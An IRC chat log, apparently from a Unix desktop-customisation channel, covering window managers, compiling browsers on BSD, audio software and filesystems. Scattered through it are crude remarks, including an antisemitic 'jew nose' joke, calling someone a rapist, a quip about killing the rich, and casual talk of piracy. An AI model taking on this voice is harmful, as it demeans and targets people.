17:28   emptytapes │  I need to figure out the keymaps for 2bwm still, I'm stuck in one terminal atm hah
17:29   emptytapes │  I thought it was modkey shift enter but that doesnt work

17:42         dcat │  I'll contact their norwegian distributor

17:43   Neuromatic │  25%?
17:43   Neuromatic │  whoa
17:43         dcat │  yeah
17:44   Neuromatic │  Living in germany seems to be deluxe :D
17:44         dcat │  on anything over $35
17:44         dcat │  meh, I'm okay with the taxes
17:44         dcat │  if I lose my house, state will get me a new one
17:44         dcat │  if I'm in an accident, they'll pay for my hospital bills
17:45   Neuromatic │  This is what a state should do.
17:45         dcat │  if I need a car, they'll fix it
17:45         dcat │  but most people are too polite in norway, so nobody asks for it
17:46         dcat │  norway's politeness is kind of autistic though
17:46         dcat │  for example; it's considered rude to talk to somebody without a good reason
17:46   Neuromatic │  I like that.

00:12       libbro │  Limitations the US has compared to Finland
00:12     vompatti │  to make it all free for students
00:12       libbro │  Common ground between the two
00:13     vompatti │  in finland, the education system is paid by taxes
00:13       libbro │  Well, the US already has that
00:13       libbro │  Ironically enough we pay MORE (on average) for individual students
00:14     vompatti │  oh, didnt know that

00:23       libbro │  Tell us more
00:24   emptytapes │  cloning dwb from git now
00:24       libbro │  Good luck
00:25   emptytapes │  it has cloned ok, just have to compile
00:25   emptytapes │  holy shit theres lot of errors
00:26     vompatti │  yeah
00:26   emptytapes │  theres only 3 dependencies though
00:28   emptytapes │  I just need libsoup and webkit, ugh
00:28         dcat │  hey brosephs
00:29        tbuck │  eyy

00:30       libbro │  tbcktu: Listen to any good dub recently
00:30   emptytapes │  webkit is going to take fucking ages to compile
00:30         dcat │  oh nice
00:30         dcat │  you should try out luakit
00:30       libbro │  luakit uses webkit too
00:30   emptytapes │  im installing it fot dwb
00:30         dcat │  libbro: yeah, that's why it's called luakit
00:31   emptytapes │  I was going to use xombrero but dwb is more keyboard based and similar to vim shortcut wise
00:31         dcat │  luakit looks exactly like dwb
00:31         dcat │  but it's easier to use
00:31         dcat │  and more sane default keybinds
00:32       libbro │  dcat: How is it easier to use?
00:32       libbro │  Apart from keybinds
00:32         dcat │  configuring
00:32        tbuck │  dwb is super easy to configure tho...
00:32       libbro │  ^
00:32       libbro │  I agree with tbcktu
00:32         dcat │  how much do you configure tbuck?
00:33   emptytapes │  you know those blue menu screens that pop up when compiling from ports?
00:33        tbuck │  i havent been using it lately but even adding custom keybinds was real simple, its got that interface
00:33       libbro │  emptytapes: Yeah
00:33   emptytapes │  can you make it automatically continue without having to press enter?
00:33   emptytapes │  I assume the default options should be fine
00:34       libbro │  I've never tried
00:34       libbro │  I always enjoyed configuring it, but it did get annoying at times
00:34   emptytapes │  i want to leave webkit compiling overnight
00:34     vompatti │  yes
00:34     vompatti │  you can
00:34   emptytapes │  vompatti: how?
00:34     vompatti │  but I can't remember what the command was
00:34   emptytapes │  ah.
00:34     vompatti │  there was even a command which goes through all the screens 
00:34     vompatti │  and compile after that
00:35   emptytapes │  ;_;
00:35     vompatti │  try make config
00:35     vompatti │  no
00:36     vompatti │  make config-recursive

00:38   emptytapes │  is there anythign wrong with using csh?
00:38     vompatti │  you should use bash instead of sh for everyday work
00:38     vompatti │  never used
00:38   emptytapes │  ok
00:38     vompatti │  but I see alot of people who uses it
00:38     vompatti │  dunno why though
00:39       libbro │  Yeah, I don't know of many people who use sh for everyday work but...
00:40     vompatti │  I meant csh
00:40       libbro │  Oh
00:40       libbro │  Well, running shell scripts doesn't count BTW

04:47     NeoTerra │  what school?
04:47     NeoTerra │  and that's good :)
04:48  thang1thang │  Walla Walla University
04:48  thang1thang │  seventh day adventist uni over at Walla Walla, WA
04:48  thang1thang │  it has an incredible undergrad engineering program
04:48     NeoTerra │  cool cool
04:49  thang1thang │  Like, most Universities only give a crap about grad programs and stuff
04:49  thang1thang │  but WWU is only undergrad with no grad (maybe one or two grad...)
04:49  thang1thang │  so they compensate by having an extremely well balanced, thought out and amazing engineering program
04:50  thang1thang │  Like, when the ABED accreditors came over to review the school 7 years ago, One of the students overheard them say to each other "this is the best damn engineering school I've ever seen". So suffice to say I'm pretty glad I'm in it
04:51  thang1thang │  Only problem is I'm ADHD, and hard of hearing (and just doxxed myeslf with that sentence ah well) and because of it I have an incredibly hard time with classes. I understand everything 'cause it's easy, but it doesn't translate into grades... :/
04:51  thang1thang │  ended up with a 2.63 GPA first quarter...
04:51     NeoTerra │  my GPA sits around a 3.0 - 3.3
04:51     NeoTerra │  depending on how fucked over by my CS classes I get
04:51  thang1thang │  lol
04:52  thang1thang │  you know what pisses me off?
04:52  thang1thang │  College writing I ended up with a C+ in the class
04:52  thang1thang │  Because of my second essay. That's it, only thing I did bad in.
04:52  thang1thang │  The first draft for the second essay, was 80%. If I had turned that in as the final draft I would've gotten a B in the class
04:52  thang1thang │  but I worked for hours on that baby because I was DETERMINED to get an A on that paper
04:52  thang1thang │  ended up with a 63% on the final draft, wtf
04:53     NeoTerra │  writing papers in university is kind of a game of chance
04:53     NeoTerra │  it all depends on how subjective your profs/TAs are
04:54  thang1thang │  Oh I know my professor, and she grades extremely methodically
04:54  thang1thang │  (it's "college writing 1: Academic writing" after all)
04:54  thang1thang │  It's just... I rewrote a LOT of the paper. Practically turned in a new paper by the time I was done with the second draft
04:54  thang1thang │  I must've messed up somewhere in organizing it or something...

05:12        tbuck │  im not sure but i remember having to change each quote by hand... something to do with the typeset she said
05:13  thang1thang │  huh, that's odd

05:38  thang1thang │  hey so
05:38  thang1thang │  what's a good *nix alternative to mathCad?
05:41     NeoTerra │  what's mathCad?
05:41  thang1thang │  ahh
05:41  thang1thang │  It's like mathematica I guess
05:41  thang1thang │  you can set variables to numbers and then type a+b = and it'll spit out the answer
05:42  thang1thang │  it's GUI based and you can make rather freaking elaborate equations with it
05:42  thang1thang │  the killer feature for me is that it'll carry units with it and convert units correctly
05:42  thang1thang │  so if I type 1500ºC = it'll spit it out in ºK (which I can change to ºF, or any other temperature measurement)
05:43  thang1thang │  this is, obviously, quite useful when doing homework and you want to double check your problem when you have like 4 different units...

09:27   emptytapes │  That's not happenning for a while then

09:28  thang1thang │  2x 1080p monitors?
09:28   emptytapes │  A Linux set up

09:29  thang1thang │  After that it's just building the tower. What specs you need on it?
09:29         BigE │  if you can get the same deal I did on monitors, you can build a system to run them, includ8ing the cost of the monitors, for about 800 bucks
09:29   emptytapes │  I already have a tower, its GTX 560, 8GB RAM AMD FX4100 so it's not great...
09:29   emptytapes │  And the HDD is starting to go
09:29         BigE │  minus the CPU, that is still a pretty stellar rig
09:29   emptytapes │  I'll probably be getting a Mac next year anyway. Help with school and such
09:30         BigE │  gag
09:30  thang1thang │  lol alright
09:30         BigE │  I used to be a mac guy
09:30         BigE │  never again
09:30   emptytapes │  I do a lot of stuff on Cubase
09:30  thang1thang │  I like my macbook pro
09:30  thang1thang │  I don't really like mac desktops at all
09:30         BigE │  It is good hardware
09:30         BigE │  not gonna lie about that
09:30         BigE │  however
09:30  thang1thang │  but damn. I can't really find a better laptop
09:30   emptytapes │  I need something that can actually run it securely. It runs like shite on Windows
09:30         BigE │  the firmware and OS are not that great though
09:31         BigE │  thang1thang2: thinkpads
09:31  thang1thang │  thinkpads are nice
09:31  thang1thang │  but I like macs for the battery life + trackpad
09:31  thang1thang │  that's... pretty much it, tbh
09:31   emptytapes │  If I can find a decent DAW that can run on Linux/BSD then I will get a nice setup like yours, BigE 
09:31  thang1thang │  and now the retina screen is amazing
09:31  thang1thang │  Cubase runs on Windows and OS X?
09:31         BigE │  my thinkpad gets a battery life that is better than my friends macs
09:31  thang1thang │  wot?
09:32  thang1thang │  What thinkpad do you have? And what's the battery life?
09:32         BigE │  emptytapes: talk to SammiCat 
09:32   emptytapes │  I know but it wont run on BSD
09:32         BigE │  she does that sort of stuff on linux I am pretty sure
09:32  thang1thang │  well
09:32     SammiCat │  ?
09:32  thang1thang │  OS X
09:32  thang1thang │  IS *BSD
09:32  thang1thang │  it's actually more unix than linux is, technically
09:32         BigE │  SammiCat: you do sound stuff on linux dont you?
09:32     SammiCat │  ope. it has a buttload of BSD code though
09:32   emptytapes │  I know....
09:32     SammiCat │  mainly NET and FREE
09:32  thang1thang │  technicalities aside, though :p
09:32   emptytapes │  But Cubase still doesnt support BSD as a raw OS
09:32         BigE │  cubase is shit though
09:33         BigE │  seriously
09:33         BigE │  stop it
09:33   emptytapes │  ;_;
09:33     SammiCat │  BigE, No. Linux/*BSD audio isn't at the level we need for proper audio engineering
09:33   emptytapes │  I love Cubase
09:33     SammiCat │  as much as I hate it
09:33     SammiCat │  i use windows
09:33     SammiCat │  for my audio work
09:33   emptytapes │  I hate using windows for audio work
09:33     SammiCat │  emptytapes, UP YOUR FUCKING GAME YOU LAMEASS.
09:33         BigE │  I used cubase for like 3 years, I hate it
09:33     SammiCat │  REAPER
09:33   emptytapes │  Haha
09:33     SammiCat │  :3
09:33         BigE │  although I think I hate Logic Pro more
09:33     SammiCat │  i am baked right now.
09:33  thang1thang │  logic pro x
09:33     SammiCat │  Logic sucks donkeycock
09:33  thang1thang │  stupidest shit ever
09:33     SammiCat │  and so does protools
09:33  thang1thang │  Logic Pro was pretty good up until X
09:33   emptytapes │  really?
09:34  thang1thang │  they removed 70% of the functionality in logic pro X
09:34  thang1thang │  people RAGED so hard
09:34   emptytapes │  I heard lots of people use ProTools still?
09:34  thang1thang │  took 2-3 versions to get most of the functionality back
09:34     SammiCat │  emptytapes, they do
09:34     SammiCat │  it doesnt mean it doesnt suck
09:34  thang1thang │  ^
09:34     SammiCat │  No VST support?
09:34     SammiCat │  the fuck/
09:34   emptytapes │  really?
09:34     SammiCat │  pro tools is the apple of audi software
09:34  thang1thang │  lol
09:34     SammiCat │  WE DONT WANT TO PLAY NICE WITH ANYONE
09:34     SammiCat │  fuck pro tools
09:34         BigE │  SammiCat: maybe if Linux ever gets proper audio engineering support I will go back to it
09:34     SammiCat │  i wont even use a pirated copy
09:35   emptytapes │  I mainly play around with samples and MIDI
09:35     SammiCat │  I PAID for Reaper
09:35         BigE │  but I dont have the patients to deal with it on windows anymore
09:35  thang1thang │  For like two months
09:35  thang1thang │  I had 100% legal software on my computer
09:35  thang1thang │  it was fucking weird
09:35  thang1thang │  I was like "oh my god I can actually run updates"
09:35     SammiCat │  im gonna be interning in a studio when i go back up north
09:35     SammiCat │  its gonna be coooool
09:35  thang1thang │  naice
09:35   emptytapes │  wow, which one?
09:35         BigE │  I have 100% legal software any time I run linux
09:35         BigE │  :)
09:35     SammiCat │  cuz im a damn good engineer but theres more i need to know!
09:35  thang1thang │  aren't you da shit boi

09:38         BigE │   SammiCat and why didnt he
09:38         BigE │  ?
09:38     SammiCat │  i didnt go for it
09:38         BigE │  y
09:38     SammiCat │  had a chance with a bigger label
09:39     SammiCat │  bigger label is like "well blergity bl;erg" now

10:15  thang1thang │  init 1 should work
10:16   emptytapes │  I need to edit rc.conf before the system boots up compeltely
10:17  thang1thang │  all OS scripts of BSD are located in /etc/rc.d/
10:17     SammiCat │  emptytapes, as far as im aware once the boot process is started you can only abort the whole thing
10:17  thang1thang │  and /usr/local/etc/rc.d/
10:17  thang1thang │  but really
10:17  thang1thang │  can you not just abort the whole boot
10:17  thang1thang │  and then get into the computer remotely
10:17  thang1thang │  and edit said configs or whatever?
10:17   emptytapes │  i guess
10:17   emptytapes │  Can I just SSH in?
10:17     SammiCat │  dude
10:17     SammiCat │  just boot the drive with a live USB
10:17   emptytapes │  ok
10:18  thang1thang │  yeah
10:18  thang1thang │  boot with live USB, get into the .config and rc.d files and changes some stuff in there

13:04  thang1thang │  nice :p
13:05  thang1thang │  well fuck
13:05  thang1thang │  it's 4am now
13:05  thang1thang │  so much for going to bed at 3
13:05  thang1thang │  but at least I have dwm fully fucking running and almost 99% configured
13:05   emptytapes │  haha
13:05   emptytapes │  I used to use dwm
13:05  thang1thang │  until?
13:06   emptytapes │  I found 2bwm
13:08  thang1thang │  2bwm's a floating window manager though
13:08  thang1thang │  not a tiling one
13:08   emptytapes │  I know, I wasn't using tiling
13:08  thang1thang │  ah
13:08  thang1thang │  I really like tiling lol
13:08  thang1thang │  fucking amazing
13:09  thang1thang │  but if you dont' use it then yeah 2bwm's probably way better
13:09   emptytapes │  I prefer floating, I only ever have 3 windows open
13:11  thang1thang │  eh fair enough
13:11  thang1thang │  my laptop screen's 13"
13:11  thang1thang │  I find that even with 3 windows, I have to have stuff with huge overlaps to get anything done
13:11  thang1thang │  so I'd rather use tiling
13:12  thang1thang │  or dwm's excellent muti screen flipping thing
13:12   emptytapes │  Ohh, that makes sense
13:12         tida │  is anyone of you using hhp for xmonad? it is an xmonad utility that hides the pointer after inactivity, similar to unclutter but supposedly superior
13:13   emptytapes │  never tried xmonad
13:13  thang1thang │  xmonad's a tiling wm
13:13  thang1thang │  I just kinda disable the fucking pointer period in a tiling wm lol
13:13         tida │  ah
13:13  thang1thang │  Or if I don't I just stab it in a corner somewhere and forget about it
13:14  thang1thang │  even sticking it in the top left corner of a desktop doesn't bother me much since my pointer isn't huge or enlarged
13:14  thang1thang │  but really, with tiling wm's the beauty of them is you never have to touch the mouse
13:14         tida │  would be nice to have a keybinding for hiding the pointer
13:14  thang1thang │  so the only time you should need your mouse is for working with interactive stuff
13:14  thang1thang │  mmm... there's probably one
13:16        venam │  you don't have to touch the mouse in 2bwm either
13:16   emptytapes │  I don't 
13:16        venam │  you can control everything with the keyboard
13:16        venam │  $100 hosting + domain /year
13:16        venam │  is that a good price?
13:16   emptytapes │  I've been trying to add keybindings for my programs but I'm having difficulty
13:17   emptytapes │  $100? For what?
13:17   emptytapes │  What's the contract
13:17        venam │  hosting + domain/year
13:17  thang1thang │  well yeah
13:17  thang1thang │  what's your bandwidth
13:17  thang1thang │  do you have accounts
13:17  thang1thang │  subdomains
13:17  thang1thang │  emails with the account?
13:17  thang1thang │  $100/year is either an amazing deal or a huge ripoff depending on what you're getting with it lol
13:17        venam │  I'm checking
13:17   emptytapes │  send a link?
13:18     aqualung │  it should be a crime against humanity to upload shittily tagged music to torrent sites
13:18   emptytapes │  haha
13:18  thang1thang │  lol
13:18  thang1thang │  what?
13:19   emptytapes │  If you're going to upload music fill in the ID3 tags atleast 
13:19  thang1thang │  You don't like THIS_SONG_HERE_in_SuPeR_CaPs_WiTh_THE_GENRE-artistname-A-L-B-U-M-N-A-M-E.mp3
13:19  thang1thang │  that's how I automatically rename everything in itunes, man
13:19  thang1thang │  if anyone ever hacks into my computer
13:19  thang1thang │  they won't be able to grep/perl/awk my data and parse it for SHIT
13:20   emptytapes │  haha
13:20        venam │  mac ...
13:20  thang1thang │  wut
13:21   emptytapes │  ?
13:21   emptytapes │  Installing ableton live :)
13:23  thang1thang │  tida: looked up some xmonad stuff
13:23  thang1thang │  http://xmonad.org/xmonad-docs/xmonad-contrib/XMonad-Actions-Warp.html this would probably be the best option for you
13:23         pico │  Title: XMonad.Actions.Warp (at xmonad.org)
13:23         tida │  investigating... thank you
13:23  thang1thang │  with a shortcut, it teleports your mousepointer to a corner
13:24  thang1thang │  and you can have another shortcut to warp it to a certain x,y on the current focused window
13:24  thang1thang │  Just make sure your xmonad settings have your mouse as useless as possible (no focus follow, etc)

18:03         Ivyl │  I have arch feed + planet in my RSS, I knew about systemd switch in advance, did everything right and here I am, Arch installtion that survived 3 drives and sysvinit → systemd switch.
18:03        tbuck │  yyo
18:03         Ivyl │  You should update server pretty often.
18:03         Ivyl │  jjumbii: yo.
18:04   venam|away │  if it's a server just for fun then it should be ok
18:04    venam|away│  venam
18:04        tbuck │  idk man. just seems like a bad idea to me having to keep up on all that shit
18:04        venam │  but I wouldn't dare put arch on a production server
18:04        tbuck │  ^
18:05         Ivyl │  Yeah. Production server with arch would suck.
18:05         Ivyl │  But since I have Arch on 1 PC and 2 laptops I see no issue there
18:06         Ivyl │  I'm even bit compulsive with p -Syu.
18:06         Ivyl │  When I stop to think my fingers open new tmux window and type that without conciousness involved.
18:09        venam │  sometimes you update and notice that you shouldn't have updated after a week

18:59     aqualung │  this is both bsd and linux
19:00     aqualung │  and the nvidia GPU is a decade old - by now you'd expect at least 2D to work /right/?

23:47  thang1thang │  weird...
23:47  thang1thang │  to be fair CSS is pretty shitty to work with a lot of the time
23:48  thang1thang │  Are you trying to position them in absolute position relative to a set screen size
23:48   emptytapes │  yes
23:48  thang1thang │  or are you trying to position them relative to each other, relative to a dymanic screen size?

23:48       fenriz │  any ideas?
23:48   emptytapes │  absolute pos, but that may be wrong
23:48  thang1thang │  depends on what you're wanting to do lol. What are you doing with the two images?
23:49   emptytapes │  just have two images in different parts of the screen

23:51   emptytapes │  just sit there, they are links
23:52  thang1thang │  ah okay
23:52  thang1thang │  If the entire website is dymanic width you'll want them to be dynamic as well

23:53         kori │  p. good
23:53  thang1thang │  but considering the website is most likely not dynamic width, you should probably just set 'em to absolute values, mmm... lemme look up some CSS syntax super quick

00:26       fenriz │  nope i am using dwm with bspmw
00:26  thang1thang │  ah okay
00:26        tbuck │  fenriz: try to delete the config.h and edit the new config.h.def so it creates a new config.h
00:27        tbuck │  who knows really, looks good to me
00:27  thang1thang │  1) I'm using OS X 2) My X11 and most everything is installed through yrmt's pkgin thing so all the libraries should be in /usr/pkg/x11...
00:27       fenriz │  tbuck: i like the sound of that.  let me try that out.
00:27  thang1thang │  so I had to change my make thing to point it correctly, but I couldn't get it to install because it could never find it
00:27  thang1thang │  pretty sure I just edited the files wrong
00:29        tbuck │  fenriz: honestly looks like it should just work :/
00:29        tbuck │  thats odd
00:29       fenriz │  you guys don't run make install?
00:29       fenriz │  only sudo make?
00:30        tbuck │  all make install does is moves the binary to your bin
00:30         kori │  fenriz: >sudo make
00:30       fenriz │  i see
00:30        tbuck │  but yeah i use that once its built
00:30         kori │  no, just regular make
00:30       fenriz │  alright
00:30         kori │  I don't think you need to make as root ever
00:30       fenriz │  done
00:30       fenriz │  let me see if it worked.
00:30         quit │  fenriz
00:30  thang1thang │  ehh... let me go back up some .files for my dwm
00:31  thang1thang │  and then I'll uninstall it
00:31  thang1thang │  see if I can get the gitpull make to work

00:31        tbuck │  thats odd... maybe a bug?
00:32       fenriz │  it is
00:32       fenriz │  i wrote in his github repo under issues.
00:32       fenriz │  if you guys are feeling brave, clone the newest version of his repo and try installing it to see if you guys get the same thing as me?
00:32        tbuck │  looks like im not updating bar anytime soon
00:32       fenriz │  something as small as not having my bar centered drives me insane haha
00:33         BigE │  fenriz: you know there are pills to fix that, right?
00:33       fenriz │  hahaha

00:42   emptytapes │  DUN DUN DUUUNNNN!
00:42  thang1thang │  but my cam wasn't working lol
00:42  thang1thang │  so I took it apart again, put the cam back in and out and in and out until photobooth liked it

00:53         BigE │  dcat: ask away
00:53  thang1thang │  lol
00:53         BigE │  i thought you did
00:53         BigE │  wtf
00:53         dcat │  elel
00:53         BigE │  you were talking about it a little while ago
00:54     SammiCat │  naw
00:54     SammiCat │  i use gauth
00:54         BigE │  OOOOOOOH
00:54  thang1thang │  why would you want yubikey anyway?
00:54     SammiCat │  yubi are those usb one tike password keythings right?
00:54         BigE │  right
00:54         BigE │  sorry to bother you
00:54         BigE │  ummm
00:54         BigE │  fuck
00:54     SammiCat │  been debating incorporating oen of those into my setup for local stuff
00:54  thang1thang │  yeah it is
00:54         BigE │  someone uses them here dcat 
00:54     SammiCat │  havent made the plunge yet though lol
00:54         dcat │  I'm pretty sure phyrne uses it
00:54         BigE │  maybe jjumbii
00:54  thang1thang │  yubikey is a password keything that allows you to set up 2-key authentication

00:54         dcat │  seems nice
00:56         BigE │  isnt yubikey some sort of one time use passwords>
00:56         BigE │  ?
00:56         dcat │  yeah
00:56         BigE │  with hardware keys
00:56         BigE │  i would be cool with some sort of 2 factor, non-regenerating authentication
00:56         BigE │  like, you must have the hardware key to enter your password
00:57         dcat │  why do all rich fucks have telescopes?
00:57         dcat │  how often do those rich fucks really look through it?
00:57  thang1thang │  lol
00:57         BigE │  dcat: they are for looking at naked women 1km away through the windows
00:57  thang1thang │  it's probably one of those things you need to buy to look cool
00:57  thang1thang │  like pianos
00:58         dcat │  piano and telescope
00:58         dcat │  all of them
00:58         dcat │  I don't get it
00:58         BigE │  maybe because they are expensive
00:58         BigE │  and make you look cultured
00:58  thang1thang │  expensive and a status symbol, yeah
00:58         dcat │  dumbasses
00:58  thang1thang │  and they're one of those things that you don't need, until you need it, and whenever you need/want it you usually need/want it on the spur of the moment
00:58         BigE │  sort of like the fucking 2000 book libraries that rich people have
00:58  thang1thang │  so you might as well have it
00:59         BigE │  and you knhow they havent read 10 books from them
00:59         dcat │  I think we're in a weird place in history
00:59         dcat │  at any other time in history, we'd pull these rich fucks out of their homes, kill them, and share their wealth
01:00  thang1thang │  lol
01:00  thang1thang │  that's... kinda true, to be honest
01:00         dcat │  yeah, I know.
01:00         dcat │  it's fucking weird.
01:00  thang1thang │  best part is the wealth disparity is even larger now than it was in, say, the french revolution era
01:00         dcat │  waaaaay worse
01:01         dcat │  we're just better off cause we have cheap industrialised food production
01:01  thang1thang │  I think it's partly because back then the average person was in poverty and locked down. It was almost as bad as segregation was in the US (if I remember correctly), only with poor vs rich
01:01  thang1thang │  yeah, now you're not starving if you're not pulling in six figures
01:01         BigE │  now even the poor have a lot of comfort
01:01         BigE │  that they wouldnt have 100 years ago
01:02         dcat │  I kind of disagree with that
01:02         dcat │  constant fear of being hospitalized in the US
01:02  thang1thang │  mm? Why do you say that?
01:02         BigE │  the US is sort of a 1 off though
01:02         dcat │  constant fear of being raped in india and arab countries
01:02         dcat │  fear of natural disasters in southern asia
01:03         BigE │  so now we are talking globally?
01:03         dcat │  people shit their pants over things that "we" dgaf about
01:03         BigE │  you know what, people only freak about that now more than before cause now you hear about every fucking case of it
01:03         dcat │  yeah, the information age
01:04        tbuck │  'muricah
01:04         dcat │  nothing's gonna change what age we're in
01:04         dcat │  but we can change that shit.
01:04         dcat │  that as in the massive fucking gap in wealth and status
01:04  thang1thang │  what dwm github do you guys clone from?
01:04         dcat │  not meaning to go all communist here
01:05  thang1thang │  I don't really wanna change the gap in wealth and status
01:05  thang1thang │  I think it's fine
01:05  thang1thang │  What I would do is streamline the government by orders of magnitude, simplify everything down as much as possible and make it so that tax evasion doesn't happen
01:05         dcat │  cause you're on the winning side?
01:06  thang1thang │  that way companies + rich people would actually contribute more to society
01:06  thang1thang │  And no, it's 'cause money carries momentum. If you try to split all the money equally, everyone ends up equally rich and thus equally poor. If it's got an imbalance, then the imbalance will widen
01:06         BigE │  i have no problem with riches and success, my problem is when the system is as corrupt as it is, and the government is working against 99.99% of the population
01:06  thang1thang │  but if it's controlled, it can help the society as a whole
01:06  thang1thang │  and yeah, government working against 99.99% of the population is a problem.
01:07         BigE │  if people can legitimately get as rich as they currently are, more power to them.
01:07         dcat │  it depends on how you aquired those riches
01:07         BigE │  but elected governments should not be actively working to allow these people to lie, cheat, steal, kill, and bribe their way to success
01:07  thang1thang │  yo ho me matey
01:07         dcat │  I agree.
01:08         dcat │  we should make a colony

01:09         dcat │  I know right
01:09  thang1thang │  Until our tax drivers get corrupted
01:09  thang1thang │  and we have to put the country into root to fix it

01:13         BigE │  in the UK, only 5% of crime caught on CCTV is ever dealt with
01:13         BigE │  a lower percentage than that is ever convicted of anything
01:13         BigE │  cctv is a joke
01:13         dcat │  I agree
01:13         dcat │  also; if the NSA has been spying on everyone at all times.
01:14         dcat │  why not ask them for proof
01:14         BigE │  someone is currently doing that
01:14         BigE │  there is a case in the US where the defendant is calling on the NSA to provide phone proof of his innocence
01:14         dcat │  cool
01:14         BigE │  since they capture everything anyways

02:14         kori │  what filesystems do you guys use when dealing with multiple operating systems?
02:14         joom │  That pork face
02:14  thang1thang │  fat32
02:14     aqualung │  fat32 or ntfs
02:14         mxtm │  ext4 or bust
02:14         dcat │  ntfs?
02:14     aqualung │  >implying other oses can read ext4 well
02:14       phyrne │  lul
02:14         dcat │  dafuq
02:14  thang1thang │  I hate using ntfs because nothing reads it but windows
02:14     aqualung │  bsd and nt would struggle
02:14         mxtm │  yeah FAT32 probablt
02:14     aqualung │  other oses happily read NTFS
02:14     aqualung │  writing is the problem
02:14         kori │  even for large HDDs?
02:14       phyrne │  ZFS, then plop whatever filesystem in a zvol ;)
02:15       phyrne │  That's how to do it
02:15      jjumbii │  you .
02:15  thang1thang │  Yeah, FAT32 only forces a max of 4GB/file
02:15         dcat │  ntfs is shit
02:15      jjumbii │  you look like a rapist
02:15  thang1thang │  99.9% of the time, I never go over that
02:15         mxtm │  emo music best music
02:15  thang1thang │  rest of the time, you can either split the file, or get around it somehow
02:15         dcat │  holy shit
02:15         dcat │  I agree with jjumbii 
02:15         mxtm │  jjumbii: me?
02:15         mxtm │  nice
02:15         mxtm │  let's find a normal pic now
02:15     aqualung │  someone call helenakitty
02:16  thang1thang │  the zfs method would be the best, though
02:16     aqualung │  we have a date for her in the "bad faces" department
02:16      jjumbii │  aqualung, she is a he
02:16         mxtm │  fuck I don't have any good pics on this damn computer
02:16         kori │  hrm
02:16      jjumbii │  i think
02:16         kori │  fat32 sounds dum on a large HDD
02:16      jjumbii │  or that might be ola

02:23  thang1thang │  lol
02:23       phyrne │  kori: What d'you mean?
02:23         kori │  you recommended ZFS for filesystems
02:23         joom │  I'm out...
02:23         kori │  but what do you use when using OpenBSD? FFS?
02:23  thang1thang │  he also loads the drivers into a vm
02:23         quit │  joom
02:23         dcat │  http://pub.iotek.org/p/NLKDWba.jpg
02:23  thang1thang │  He uses ZFS in an array and then loads the disks into a vm I think
02:23         dcat │  me drunk a couple years ago
02:24       phyrne │  You asked about when using multiple OS'. I don't multiboot. I just use FFS2 on OpenBSD
02:24         mxtm │  dcat: can I be you tho
02:24         dcat │  notice; jew nose

02:24  thang1thang │  5' 6-6.5"
02:25         mxtm │  you're short
02:25         mxtm │  as fuck
02:25  thang1thang │  still growing a little bit, I'll probably end up at 5'7" or 5'8"
02:25  thang1thang │  I've jumped and touched the basketball rim before tho

02:25         dcat │  asian jewfro?
02:25         mxtm │  hue. I'm still growing a ton
02:25  thang1thang │  you're what, 6'2" right?
02:25         mxtm │  I'm prolly gonna end up at 6'3"

02:25  thang1thang │  but seriously, if I was 5'10" I would be able to dunk with my current hops
02:25         kori │  phyrne: oh okay
02:26         mxtm │  hey guys
02:26         mxtm │  pay attention to me
02:26         mxtm │  i crave attention and am a huge attention whore
02:26  thang1thang │  well obviously...
02:26  thang1thang │  breaking news. Sky is blue, grass green
02:26         mxtm │  fuck.
02:26       phyrne │  :p
02:27         kori │  phyrne: I've always liked OpenBSD's philosophies but it just seems inviable to use
02:27       phyrne │  kori: How so? I'm curious?
02:27         kori │  filesystems seems to be a huge problem across various OSs
02:27         mxtm │  that's why you use one OS
02:27       phyrne │  ^ this
02:27         mxtm │  and you learn to
02:27         mxtm │  decide™
02:27  thang1thang │  Or really
02:27  thang1thang │  You decentralize the data
02:28         kori │  thang1thang2: that also seems to be a viable option
02:28  thang1thang │  once the data is self contained, you can jump in and jump out of the data through terminals
02:28       phyrne │  Yes indeed
02:28         kori │  i'll look into this in more detail later on
02:28  thang1thang │  You don't have to actually have a format of hard drive that any computer can boot off of
02:28  thang1thang │  you just need to have a sort of server array
02:28  thang1thang │   /r/DataHoarders is a great example of this
02:28         mxtm │  lol
02:28         mxtm │  that sub
02:28       phyrne │  I keep all my movies/music/tv shows on a SmartOS server, then access that via NFS on all my other systems
02:28  thang1thang │  lots of those guys have 15-20TB+ setups
02:29         mxtm │  thang1thang2: that's a lot of por
02:29         mxtm │  n
02:29         kori │  I should look into building my own server soon
02:29  thang1thang │  that they can access from anywhere on the internet
02:29  thang1thang │  Eh. Uncompressed music. Full 1080p blue-ray rips. That is a TON of data right there
02:29  thang1thang │  real .isos from blu-rays are like 50-60GB
02:29         mxtm │  true
02:29      jjumbii │  gonna watch the big lebowski again tonight to celebrate my ordination as a dudeist priest
02:29  thang1thang │  none of that YiFi piratebay shit
02:29         mxtm │  if I could I'd do that
02:29         mxtm │  lol
02:30      jjumbii │  tfw i cam marry people
02:30         mxtm │  dat YIFY tho
02:30      jjumbii │  *can
02:30         mxtm │  jjumbii: pls marry me and myself
02:30  thang1thang │  I like yify because they're small files with decent quality
02:30  thang1thang │  but if I'm actually going to archive data
02:30       phyrne │  I only have an 8TB raidz2 setup.... so really only 4TB of space, and I'm running out.... fast :/
02:30  thang1thang │  I'm getting real high quality shit
02:30  thang1thang │  damn
02:30  thang1thang │  z2 is equiv of raid5 right?
02:30       phyrne │  Somewhat similar
02:31  thang1thang │  shouldn't that be about 60-70% space utilization then?
02:31       phyrne │  I can't do it justice, read up on it :)
02:31         kori │  phyrne: do you use ZFS in your smartOS setup?
02:31  thang1thang │  oh I have read up on it, just making sure I'm remembering correct :p
02:31       phyrne │  kori: Of course
02:31         kori │  neat
02:31       phyrne │  thang1thang2: Heh :) Well, it's purely for redundancy, I actually get 50% of the actual space

02:35  thang1thang │  lol no problem bro
02:36  thang1thang │  it's one of my favorite subreddits for the data thing

02:36  thang1thang │   /r/opendirectories is pretty fantastic for finding cool stuff
02:36       phyrne │  "My 32TB desktop".... lolwot
02:36         kori │  I should explore reddit more
02:36         kori │  I'm more of a 4chan guy
02:36         mxtm │  do any of you listen to stuff like me tho

02:36         mxtm │  !np
02:36       phyrne │  I should post "My 64GB desktop"
02:36  thang1thang │  go to /top/ of the subreddit. Find out the dude with the .96PB amount of data
02:36       phyrne │  thang1thang2: :|
02:36       phyrne │  wat
02:36       phyrne │  ....
02:36       phyrne │  srsly?
02:36  thang1thang │  yeah lol
02:36  thang1thang │  he downloads about 4TB worth of stuff a day
02:37       phyrne │  holy fuck
02:37         mxtm │  what
02:37         mxtm │  that's insane
02:37  thang1thang │  from his company's connection that they  never use
02:37         mxtm │  how much of it is porn
02:37         mxtm │  isn't a bit of it?
